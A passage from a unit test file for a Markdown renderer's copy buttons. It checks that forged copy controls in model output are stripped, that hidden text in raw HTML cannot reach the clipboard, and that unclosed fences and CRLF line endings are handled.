    it('counts quotes and code blocks apart', () => {
      const root = renderCode('> quoted\n\n```\nx\n```');

      expect(root.querySelector('.md-quote-copy-btn')!.getAttribute('aria-label')).toBe('Copy quote as Markdown');
      expect(buttons(root).map(b => b.getAttribute('aria-label'))).toEqual(['Copy code']);
    });

    it('removes controls, wrappers and code tags that came from the model, and keeps the real button', () => {
      const root = renderCode(
        'Text <button class="action-btn md-code-copy-btn" data-md-code-text="evil">x</button> ' +
        '<span class="md-code-copy-status" role="status">Copied</span>\n\n' +
        '<div class="md-code-copyable"><pre>forged wrapper</pre></div>\n\n' +
        '<pre data-md-code="00000000-0000-0000-0000-000000000000-0"><code>forged</code></pre>\n\n' +
        '```\nreal\n```');
      const all = buttons(root);

      expect(all.length).toBe(1);
      expect(all[0].getAttribute('data-md-code-text')).toBe('real');
      expect(root.querySelectorAll('[data-md-code-text]').length).toBe(1);
      expect(root.querySelectorAll('.md-code-copyable').length).toBe(1);
      expect(root.querySelectorAll('.md-code-copy-status').length).toBe(1);
      expect(root.querySelector('[data-md-code]')).toBeNull();
      expect(root.textContent).not.toContain('forged wrapper');
      expect(root.textContent).toContain('forged');
    });

    it('gives a raw HTML pre no button, so hidden text cannot reach the clipboard', () => {
      const root = renderCode('<pre><code>shown<span style="display:none">hidden</span></code></pre>');

      expect(root.querySelector('pre')).toBeTruthy();
      expect(buttons(root).length).toBe(0);
      expect(root.querySelector('.md-code-copyable')).toBeNull();
    });

    it('copies the partial code of an unclosed fence', () => {
      const all = buttons(renderCode('Start:\n\n```py\nx = 1\ny = 2'));

      expect(all.length).toBe(1);
      expect(all[0].getAttribute('data-md-code-text')).toBe('x = 1\ny = 2');
    });

    it('copies CRLF input with LF line endings', () => {
      expect(buttons(renderCode('```\r\na\r\nb\r\n```'))[0].getAttribute('data-md-code-text')).toBe('a\nb');
    });
  });
});
